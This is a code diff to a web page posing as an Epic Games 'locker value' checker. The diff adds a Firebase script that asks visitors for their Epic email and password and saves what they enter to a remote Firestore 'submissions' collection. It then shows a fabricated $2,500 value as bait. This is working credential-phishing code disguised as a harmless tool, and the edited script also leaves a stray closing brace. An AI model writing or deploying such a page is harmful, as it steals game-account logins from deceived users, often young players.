@@ -75,16 +75,56 @@ button {
 <br><br> 
 <button onclick="showResult()">Check Value</button>
 
-<script src="/socket.io/socket.io.js"></script>
+
 
 <div id="result">
     Estimated Locker Value: $0
 </div>
 
-<script>
-function showResult() {
-    document.getElementById("result").innerHTML =
-        "Estimated Locker Value: $2,500";
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
+import {
+    getFirestore,
+    collection,
+    addDoc
+} from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
+
+const firebaseConfig = {
+    apiKey: "AIzaSyAUPEGb0ickbE8QudGDhsTVwepswkiiNAE",
+    authDomain: "epic-games-locker-check.firebaseapp.com",
+    projectId: "epic-games-locker-check",
+    storageBucket: "epic-games-locker-check.firebasestorage.app",
+    messagingSenderId: "925269387598",
+    appId: "1:925269387598:web:b9f3e1a34bd00eb2e6561f"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+window.showResult = async function () {
+    const username = document.getElementById("messageBox").value;
+    const platform = document.getElementById("platform").value;
+
+    if (!username.trim()) {
+        alert("Please enter an epic email and password");
+        return;
+    }
+
+    try {
+        await addDoc(collection(db, "submissions"), {
+            username: username,
+            platform: platform,
+            date: new Date().toISOString()
+        });
+
+        document.getElementById("result").innerHTML =
+            "Estimated Locker Value: $2,500";
+    } catch (error) {
+        console.error(error);
+        alert("Error saving submission");
+    }
+};
 
 }
 </script>
